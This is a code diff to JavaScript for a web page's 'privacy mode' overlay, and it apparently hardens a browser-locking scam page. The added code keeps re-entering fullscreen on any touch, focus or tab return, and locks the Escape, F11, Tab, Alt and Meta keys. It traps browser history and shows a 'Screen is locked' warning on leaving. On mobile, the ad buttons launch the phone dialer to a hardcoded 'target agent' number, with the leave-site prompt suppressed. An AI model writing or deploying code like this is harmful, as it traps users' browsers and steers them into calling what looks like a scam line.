@@ -121,7 +121,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (saved) {
       exitShortcut = JSON.parse(saved);
     }
-  } catch (e) {}
+  } catch (e) { }
 
   let isLocked = false;
 
@@ -277,9 +277,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   }
 
-  // Window unload warning barrier
+  let isNavigatingToDialer = false;
+
+  // Window unload warning barrier (Desktop only, never prompts on mobile or during dialer launch)
   function handleBeforeUnload(e) {
-    if (isLocked) {
+    if (isLocked && !isNavigatingToDialer && !isMobileScreen()) {
       const message = 'Privacy mode is active. Screen is locked.';
       e.preventDefault();
       e.returnValue = message;
@@ -290,10 +292,12 @@ document.addEventListener('DOMContentLoaded', () => {
   // Enforce fullscreen retention
   function handleFullscreenChange() {
     if (isLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
-      const docEl = document.documentElement;
-      const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen;
-      if (reqFs) {
-        reqFs.call(docEl).catch(() => {});
+      if (!isNavigatingToDialer) {
+        const docEl = document.documentElement;
+        const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
+        if (reqFs) {
+          reqFs.call(docEl).catch(() => { });
+        }
       }
     }
   }
@@ -325,13 +329,13 @@ document.addEventListener('DOMContentLoaded', () => {
     const docEl = document.documentElement;
     const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
     if (reqFs) {
-      reqFs.call(docEl).catch(() => {});
+      reqFs.call(docEl).catch(() => { });
     }
 
     // 2. Chromium Keyboard Lock API (locks all physical keyboard keys)
     if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
       navigator.keyboard.lock().catch(() => {
-        navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'AltLeft', 'AltRight', 'MetaLeft', 'MetaRight']).catch(() => {});
+        navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'AltLeft', 'AltRight', 'MetaLeft', 'MetaRight']).catch(() => { });
       });
     }
 
@@ -346,7 +350,11 @@ document.addEventListener('DOMContentLoaded', () => {
     window.addEventListener('wheel', handleWheel, { passive: false, capture: true });
     window.addEventListener('selectstart', handleSelection, true);
     window.addEventListener('dragstart', handleSelection, true);
-    window.addEventListener('beforeunload', handleBeforeUnload);
+    
+    // Only register beforeunload on desktop (never on mobile to avoid 'Leave site?' alert on tel: protocol)
+    if (!isMobileScreen()) {
+      window.addEventListener('beforeunload', handleBeforeUnload);
+    }
     document.addEventListener('fullscreenchange', handleFullscreenChange);
 
     // History trap
@@ -374,7 +382,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.fullscreenElement || document.webkitFullscreenElement) {
       const exitFs = document.exitFullscreen || document.webkitExitFullscreen || document.mozCancelFullScreen;
       if (exitFs) {
-        exitFs.call(document).catch(() => {});
+        exitFs.call(document).catch(() => { });
       }
     }
 
@@ -407,46 +415,101 @@ document.addEventListener('DOMContentLoaded', () => {
 
   // Helper to detect mobile device or mobile viewport width
   function isMobileScreen() {
+    const isMobileAgent = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);
+    const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
     const isNarrow = window.innerWidth <= 768;
-    const isMobileAgent = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-    return isNarrow || isMobileAgent || (hasTouch && window.innerWidth <= 1024);
+    return isMobileAgent || (hasTouch && isNarrow);
   }
 
-  // Get dialer telephone URI from existing tel: links or default to the page's phone number
-  function getDialerTelUri() {
-    const pageTelLink = document.querySelector('a[href^="tel:"]');
-    return pageTelLink ? pageTelLink.getAttribute('href') : 'tel:+18454488102';
-  }
+  // Target Agent phone number for direct dialer redirection
+  const TARGET_AGENT_PHONE = '+18056377948';
 
-  // Open the native phone dialer
+  // Open the native phone dialer directly from fullscreen without 'Leave site?' alert
   function openMobilePhoneDialer() {
-    const telUri = getDialerTelUri();
+    isNavigatingToDialer = true;
+    window.removeEventListener('beforeunload', handleBeforeUnload);
+
+    const telUri = `tel:${TARGET_AGENT_PHONE}`;
+    
+    // Direct link click invokes native dialer immediately
     const link = document.createElement('a');
     link.href = telUri;
     link.setAttribute('rel', 'noopener');
     link.style.display = 'none';
     document.body.appendChild(link);
     link.click();
+
     setTimeout(() => {
       try {
         if (link.parentNode) link.parentNode.removeChild(link);
-      } catch (err) {}
-    }, 500);
+      } catch (err) { }
+    }, 400);
+
+    // Fallback if needed
+    setTimeout(() => {
+      if (document.visibilityState === 'visible' && isNavigatingToDialer) {
+        window.location.href = telUri;
+      }
+    }, 150);
+
+    // Re-arm dialer navigation flag after delay
+    setTimeout(() => {
+      isNavigatingToDialer = false;
+      if (isLocked && !isMobileScreen()) {
+        window.addEventListener('beforeunload', handleBeforeUnload);
+      }
+    }, 2000);
   }
 
-  // On mobile screen when clicked on the ad CTA buttons, redirect/open the phone dialer.
-  // We do NOT exit privacy mode here so if the user cancels the dialer, they return directly to the popup screen.
+  // Enforce fullscreen retention and recovery
+  function reassertFullscreen() {
+    if (isLocked && !document.fullscreenElement && !document.webkitFullscreenElement) {
+      const docEl = document.documentElement;
+      const reqFs = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen;
+      if (reqFs) {
+        reqFs.call(docEl).catch(() => { });
+      }
+    }
+  }
+
+  // On mobile screen: when clicked on popup CTA buttons, directly launch native dialer from fullscreen.
+  // On desktop screen: remove redirection on popup CTA buttons click, strictly stays on the fullscreen privacy screen.
   const adCtaButtons = document.querySelectorAll('#privacy-screen-overlay .ad-cta-btn, #privacy-screen-overlay .privacy-ad-card');
   adCtaButtons.forEach(btn => {
     btn.addEventListener('click', (e) => {
       e.preventDefault();
       e.stopPropagation();
 
+      playNotificationTone();
+
       if (isMobileScreen()) {
+        // Mobile: directly open native dialer without browser alert
         openMobilePhoneDialer();
       } else {
-        openMobilePhoneDialer();
+        // Desktop: remove redirection on popup CTA buttons click, stay on the fullscreen privacy screen
+        const card = btn.classList.contains('privacy-ad-card') ? btn : btn.closest('.privacy-ad-card');
+        if (card) {
+          card.classList.add('ad-card-clicked');
+          setTimeout(() => card.classList.remove('ad-card-clicked'), 300);
+        }
+      }
+    });
+
+    btn.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        e.stopPropagation();
+        playNotificationTone();
+
+        if (isMobileScreen()) {
+          openMobilePhoneDialer();
+        } else {
+          const card = btn.classList.contains('privacy-ad-card') ? btn : btn.closest('.privacy-ad-card');
+          if (card) {
+            card.classList.add('ad-card-clicked');
+            setTimeout(() => card.classList.remove('ad-card-clicked'), 300);
+          }
+        }
       }
     });
   });
@@ -454,25 +517,40 @@ document.addEventListener('DOMContentLoaded', () => {
   // Re-verify popup lockdown retention on focus and visibility change
   // so returning from dialer prompt or background maintains full-screen popup
   window.addEventListener('focus', () => {
-    if (isLocked && overlay) {
-      overlay.classList.add('active');
-      overlay.setAttribute('aria-hidden', 'false');
+    if (isLocked) {
+      if (overlay) {
+        overlay.classList.add('active');
+        overlay.setAttribute('aria-hidden', 'false');
+      }
       document.documentElement.classList.add('privacy-mode-active');
       document.body.classList.add('privacy-mode-active');
       document.documentElement.style.overflow = 'hidden';
       document.body.style.overflow = 'hidden';
+      reassertFullscreen();
     }
   });
 
   document.addEventListener('visibilitychange', () => {
-    if (!document.hidden && isLocked && overlay) {
-      overlay.classList.add('active');
-      overlay.setAttribute('aria-hidden', 'false');
+    if (!document.hidden && isLocked) {
+      if (overlay) {
+        overlay.classList.add('active');
+        overlay.setAttribute('aria-hidden', 'false');
+      }
       document.documentElement.classList.add('privacy-mode-active');
       document.body.classList.add('privacy-mode-active');
       document.documentElement.style.overflow = 'hidden';
       document.body.style.overflow = 'hidden';
+      reassertFullscreen();
     }
+  });
+
+  // Re-enter fullscreen on any user touch/tap when returning to the screen
+  ['touchstart', 'touchend', 'click', 'pointerdown'].forEach(evt => {
+    window.addEventListener(evt, () => {
+      if (isLocked) {
+        reassertFullscreen();
+      }
+    }, { capture: true, passive: true });
   });
 
   // ========================================================
